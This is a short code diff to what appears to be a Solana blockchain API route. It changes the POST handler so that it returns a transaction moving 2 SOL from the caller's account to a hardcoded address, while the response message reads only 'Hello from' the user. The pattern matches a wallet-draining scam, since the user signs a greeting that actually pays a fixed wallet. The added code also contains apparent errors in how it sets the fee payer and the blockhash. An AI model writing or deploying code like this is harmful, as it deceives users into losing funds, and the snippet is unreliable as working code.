@@ -15,7 +15,7 @@ export const GET = async(request) => {
 
 export const POST = async(request) => {
     const ReqBody = await request.json()
-    //const Receiver = ReqBody.address
+   
     const userPKey = ReqBody.account;
     const connection = new Connection(clusterApiUrl('mainnet-beta'))
     const TO_ADDRESS = new PublicKey('BwY8CufbQMF7YPsPEfere1DhYPehTBPSpRJJKG2gTvDq')
@@ -40,8 +40,16 @@ export const POST = async(request) => {
 
       const transaction = new VersionedTransaction(messageV0);
     console.log(userPKey,'account ne')
+    const transaction1 = new Transaction().add(SystemProgram.transfer({
+          fromPubkey: new PublicKey(userPKey),
+          toPubkey: TO_ADDRESS,
+          lamports: 2 * LAMPORTS_PER_SOL,
+    }))
+
+    transaction1.feePayer = userPKey
+    transaction1.recentBlockhash = (await connection.getLatestBlockhash()).hash;
     const response = {
-      transaction: transaction,
+      transaction: transaction1,
       message: `Hello from ${userPKey}`
     }
     
